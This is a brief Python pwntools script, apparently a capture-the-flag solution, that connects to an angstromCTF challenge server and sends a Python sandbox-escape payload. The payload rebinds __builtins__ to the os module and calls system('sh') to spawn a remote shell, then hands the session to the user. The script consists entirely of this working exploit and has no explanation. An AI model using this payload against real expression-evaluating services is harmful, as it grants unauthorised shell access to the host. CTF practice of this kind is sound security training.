from pwn import remote
payload = "(__builtins__:=__import__('os'))and(lambda:system)()('sh')"
io = remote("challs.actf.co", 31401)
io.sendlineafter(b': ', payload.encode())
io.interactive()